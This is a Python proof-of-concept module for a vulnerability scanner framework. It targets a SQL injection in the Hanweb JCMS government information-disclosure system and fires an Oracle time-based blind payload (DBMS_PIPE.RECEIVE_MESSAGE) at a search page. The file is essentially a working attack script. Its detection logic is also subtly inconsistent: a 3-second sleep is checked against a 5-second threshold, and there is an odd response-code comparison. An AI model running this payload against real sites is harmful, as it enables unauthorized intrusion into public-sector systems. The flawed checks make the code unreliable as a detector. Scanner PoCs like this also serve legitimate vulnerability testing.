# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'JCMS_0016'  # 平台漏洞编号，留空
    name = '南京大汉某政府信息公开系统存在通用型SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-02-05'  # 漏洞公布时间
    desc = '''
        南京大汉某政府信息公开系统存在通用型SQL注入
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0150571'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4edaa049-da4d-444d-b99b-7d8dcd8b0046'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/jcms_files/jcms1/web1/site/zfxxgk/ysqgk/ysqgksearch.jsp"
            postpayload = "currpage=&stateid=1&applystarttime=&applyendtime=&webid=1"
            postpayload2 = postpayload + \
                '%20AND%207380=DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(102)||CHR(77)||CHR(115),3)'
            time0 = time.time()
            code1, head, res, errcode, _ = hh.http(url, postpayload)
            time1 = time.time()
            code2, head, res, errcode, _ = hh.http(url, postpayload2)
            time2 = time.time()
            if code1 != 0 and code2 != 2 and ((time2 - time1) - (time1 - time0)) >= 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
